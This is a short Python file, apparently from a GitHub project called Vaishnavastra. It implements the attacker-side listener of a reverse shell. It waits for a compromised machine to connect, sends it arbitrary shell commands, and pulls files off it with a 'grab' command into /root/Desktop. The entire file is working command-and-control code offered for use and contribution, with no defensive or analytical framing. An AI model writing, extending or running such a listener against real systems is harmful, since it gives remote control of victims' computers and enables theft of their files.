#By SxNade
#https://github.com/SxNade/Vaishnavastra
#CONTRIBUTE

import socket
import sys
from termcolor import colored
import os

Serv_ip = sys.argv[1]
Serv_port = int(sys.argv[2])

def transfer(conn, command):
    conn.send(command.encode())
    grab, path = command.split('*')
    f = open('/root/Desktop'+ '/' + path, 'wb')
    while True:
        bits = conn.recv(1024)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            print(colored("[+]Transfer Completed..", "green", attrs=['bold']))
            break
        if 'FILE NOT FOUND'.encode() in bits:
            print(colored('[!]File NotFound...!', 'red', attrs=['bold']))
            break
        f.write(bits)

def connecting():
    s = socket.socket()
    s.bind((Serv_ip, Serv_port))
    s.listen(1)
    conn, addr = s.accept()
    print(colored(f"[+] {addr} Connected Now!", 'green'))

    while True:
        command = input(colored("$ ", 'red', attrs=['bold'])) 
        if 'exit' in command:
            conn.send('exit'.encode())
            conn.close()
            break
        elif command == '':
            conn.send('whoami'.encode())
            print(conn.recv(8192).decode())
        elif 'grab' in command:
            transfer(conn, command)
        else:
            conn.send(command.encode())
            print(conn.recv(8192).decode())

def main():
    connecting()

main()
